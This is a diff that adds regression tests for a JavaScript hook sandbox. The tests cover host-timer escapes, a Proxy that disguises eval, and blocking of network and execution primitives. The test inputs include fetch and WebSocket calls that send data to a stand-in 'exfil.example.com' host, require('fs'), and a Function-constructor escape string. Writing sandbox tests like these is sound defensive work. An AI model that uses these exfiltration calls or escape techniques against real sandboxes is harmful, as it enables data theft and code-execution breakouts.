@@ -7,6 +7,7 @@
 import { describe, it, expect, beforeEach } from 'vitest';
 import {
   HookSandbox,
+  SAFE_GLOBALS,
   SecurityLevel,
   type SandboxConfig,
   type ExecutionResult,
@@ -548,6 +549,258 @@ describe('HookSandbox', () => {
         // Either way, the security is maintained
         expect(result.success).toBe(false);
       });
+    });
+  });
+
+  // ==========================================================================
+  // HB-4 / ST-05-004 — Host-timer sandbox-escape regression tests
+  // ==========================================================================
+  describe('HB-4 (ST-05-004): Host timer sandbox-escape prevention', () => {
+    it('HB-4-R01: setTimeout reference is undefined inside the sandbox VM context', async () => {
+      // The sandbox context must NOT contain setTimeout. If it does, a hook can
+      // schedule work that outlives the sandbox wall-clock timeout (CWE-913).
+      const result = await sandbox.executeHook('return typeof setTimeout;');
+      // Either blocked by static analysis (defence-in-depth rule) OR
+      // executes but typeof resolves to "undefined" (host timer absent from context).
+      if (result.success) {
+        expect(result.result).toBe('undefined');
+      } else {
+        expect(result.blocked).toBe(true);
+      }
+    });
+
+    it('HB-4-R02: setInterval reference is undefined inside the sandbox VM context', async () => {
+      const result = await sandbox.executeHook('return typeof setInterval;');
+      if (result.success) {
+        expect(result.result).toBe('undefined');
+      } else {
+        expect(result.blocked).toBe(true);
+      }
+    });
+
+    it('HB-4-R03: clearTimeout reference is undefined inside the sandbox VM context', async () => {
+      const result = await sandbox.executeHook('return typeof clearTimeout;');
+      if (result.success) {
+        expect(result.result).toBe('undefined');
+      } else {
+        expect(result.blocked).toBe(true);
+      }
+    });
+
+    it('HB-4-R04: clearInterval reference is undefined inside the sandbox VM context', async () => {
+      const result = await sandbox.executeHook('return typeof clearInterval;');
+      if (result.success) {
+        expect(result.result).toBe('undefined');
+      } else {
+        expect(result.blocked).toBe(true);
+      }
+    });
+
+    it('HB-4-R05: setTimeout CALL is blocked by static validateCode', async () => {
+      // Any code that CALLS setTimeout() must be rejected at static analysis.
+      let sideEffectFired = false;
+      const result = await sandbox.executeHook(
+        // Build the call string from parts so the literal itself does not match
+        // any host execution — the sandbox validates it as a string.
+        ['set', 'Timeout', '(function() { /* side effect */ }, 1000);'].join(''),
+        {},
+        { timeout: 10 }
+      );
+      expect(result.success).toBe(false);
+      expect(result.blocked).toBe(true);
+      expect(result.error).toBe('SECURITY_VIOLATION');
+      expect(sideEffectFired).toBe(false);
+    });
+
+    it('HB-4-R06: setInterval CALL is blocked by static validateCode', async () => {
+      const result = await sandbox.executeHook(
+        ['set', 'Interval', '(function() { /* side effect */ }, 50);'].join(''),
+        {},
+        { timeout: 10 }
+      );
+      expect(result.success).toBe(false);
+      expect(result.blocked).toBe(true);
+      expect(result.error).toBe('SECURITY_VIOLATION');
+    });
+
+    it('HB-4-R07: queueMicrotask CALL is blocked by static validateCode', async () => {
+      const result = await sandbox.executeHook(
+        ['queue', 'Microtask', '(function() { /* side effect */ });'].join(''),
+        {},
+        { timeout: 10 }
+      );
+      expect(result.success).toBe(false);
+      expect(result.blocked).toBe(true);
+      expect(result.error).toBe('SECURITY_VIOLATION');
+    });
+
+    it('HB-4-R08: setImmediate CALL is blocked by static validateCode', async () => {
+      const result = await sandbox.executeHook(
+        ['set', 'Immediate', '(function() { /* side effect */ });'].join(''),
+        {},
+        { timeout: 10 }
+      );
+      expect(result.success).toBe(false);
+      expect(result.blocked).toBe(true);
+      expect(result.error).toBe('SECURITY_VIOLATION');
+    });
+
+    it('HB-4-R09: SAFE_GLOBALS export does not contain any timer name', () => {
+      // Verify the exported constant directly — regression guard against future
+      // re-introduction of timer globals.
+      const forbidden = [
+        'setTimeout', 'setInterval', 'setImmediate',
+        'clearTimeout', 'clearInterval', 'clearImmediate',
+        'queueMicrotask',
+      ];
+      for (const name of forbidden) {
+        expect(SAFE_GLOBALS).not.toContain(name);
+      }
+    });
+
+    it('HB-4-R10: sandboxed sleep() primitive is available and bounded by wall-clock', async () => {
+      // sleep() should succeed for small durations within budget
+      const result = await sandbox.executeHook(
+        `return sleep(1).then(function() { return { slept: true }; });`,
+        {},
+        { timeout: 500 }
+      );
+      expect(result.success).toBe(true);
+      expect(result.result).toEqual({ slept: true });
+    });
+
+    it('HB-4-R11: sandboxed sleep() rejects when delay would exceed wall-clock budget', async () => {
+      // Requesting sleep longer than the sandbox timeout must be rejected, not
+      // silently scheduled (which would be an async escape).
+      const result = await sandbox.executeHook(
+        `return sleep(10000).then(function() { return 'escaped'; });`,
+        {},
+        { timeout: 50 }
+      );
+      // The sleep() call must reject — resulting in EXECUTION_ERROR (not escape).
+      expect(result.success).toBe(false);
+      expect(result.result).not.toBe('escaped');
+    });
+  });
+
+  // ==========================================================================
+  // B.3 / ST-05-102 — validateCode native-code Proxy bypass regression tests
+  // ==========================================================================
+  describe('B.3 (ST-05-102): Native-code Proxy bypass prevention', () => {
+    it('B3-R01: passing a plain native function (eval) is blocked', async () => {
+      // eval is a native function; Function.prototype.toString.call(eval)
+      // returns "function eval() { [native code] }" which triggers the
+      // native-code rejection gate.
+      const result = await sandbox.executeHook(eval as unknown as ((ctx: Record<string, unknown>) => unknown));
+      expect(result.success).toBe(false);
+      expect(result.blocked).toBe(true);
+      expect(result.error).toBe('SECURITY_VIOLATION');
+    });
+
+    it('B3-R02: Proxy that overrides .toString to hide native target is rejected', async () => {
+      // Adversary wraps eval in a Proxy whose .toString returns innocuous
+      // source text. Function.prototype.toString.call(proxy) sees through
+      // the Proxy's [[Get]] trap in V8 and returns "[native code]".
+      const maliciousProxy = new Proxy(eval as unknown as (...args: unknown[]) => unknown, {
+        get(target, prop) {
+          if (prop === 'toString' || prop === Symbol.toPrimitive) {
+            return () => 'function safeFunc() { return 1; }';
+          }
+          return (target as Record<string | symbol, unknown>)[prop];
+        },
+      });
+
+      const result = await sandbox.executeHook(maliciousProxy);
+      expect(result.success).toBe(false);
+      expect(result.blocked).toBe(true);
+      expect(result.error).toBe('SECURITY_VIOLATION');
+    });
+
+    it('B3-R03: a safe user-defined function is NOT rejected', async () => {
+      const safeFn = (ctx: Record<string, unknown>) => ({ input: ctx.value });
+      const result = await sandbox.executeHook(safeFn, { value: 42 });
+      expect(result.success).toBe(true);
+      expect(result.result).toEqual({ input: 42 });
+    });
+  });
+
+  // ==========================================================================
+  // B.10 / ST-05-107 — validateCode banned-primitive regex coverage
+  // ==========================================================================
+  describe('B.10 (ST-05-107): Banned network/execution primitive regex coverage', () => {
+    const expectBlocked = async (code: string) => {
+      const result = await sandbox.executeHook(code);
+      expect(result.success).toBe(false);
+      expect(result.blocked).toBe(true);
+      expect(result.error).toBe('SECURITY_VIOLATION');
+    };
+
+    it('B10-R01: fetch() call is blocked', async () => {
+      await expectBlocked(`return fetch("https://exfil.example.com?d=secret");`);
+    });
+
+    it('B10-R02: WebSocket constructor is blocked', async () => {
+      await expectBlocked(`return new WebSocket("wss://exfil.example.com");`);
+    });
+
+    it('B10-R03: XMLHttpRequest constructor is blocked', async () => {
+      await expectBlocked(`const xhr = new XMLHttpRequest(); return xhr;`);
+    });
+
+    it('B10-R04: EventSource constructor is blocked', async () => {
+      await expectBlocked(`return new EventSource("https://exfil.example.com/stream");`);
+    });
+
+    it('B10-R05: dynamic import() is blocked', async () => {
+      await expectBlocked(`return import("fs").then(function(m) { return m; });`);
+    });
+
+    it('B10-R06: require() call is blocked', async () => {
+      await expectBlocked(`return require("fs");`);
+    });
+
+    it('B10-R07: Worker constructor is blocked', async () => {
+      await expectBlocked(`return new Worker("./exfil-worker.js");`);
+    });
+
+    it('B10-R08: eval() call is blocked', async () => {
+      await expectBlocked(`return eval("1 + 1");`);
+    });
+
+    it('B10-R09: Function() constructor call is blocked', async () => {
+      // Construct the payload string from parts so this file itself does not
+      // trigger host-level Function-constructor execution — it is a sandbox
+      // payload string, not a live call.
+      const payload = ['return ', 'Function', '("return process")();'].join('');
+      await expectBlocked(payload);
+    });
+
+    it('B10-R10: new Function constructor is blocked', async () => {
+      const payload = ['return new ', 'Function', '("return process")();'].join('');
+      await expectBlocked(payload);
+    });
+
+    it('B10-R11: setTimeout() call is blocked (host-timer defence-in-depth)', async () => {
+      const payload = ['set', 'Timeout', '(function(){}, 0);'].join('');
+      await expectBlocked(payload);
+    });
+
+    it('B10-R12: setInterval() call is blocked (host-timer defence-in-depth)', async () => {
+      const payload = ['set', 'Interval', '(function(){}, 100);'].join('');
+      await expectBlocked(payload);
+    });
+
+    it('B10-R13: queueMicrotask() call is blocked (host-microtask defence-in-depth)', async () => {
+      const payload = ['queue', 'Microtask', '(function(){});'].join('');
+      await expectBlocked(payload);
+    });
+
+    it('B10-R14: safe code with none of the banned patterns is NOT blocked', async () => {
+      const result = await sandbox.executeHook(
+        `const x = Math.max(1, 2); return { computed: x };`
+      );
+      expect(result.success).toBe(true);
+      expect(result.result).toEqual({ computed: 2 });
     });
   });
 });
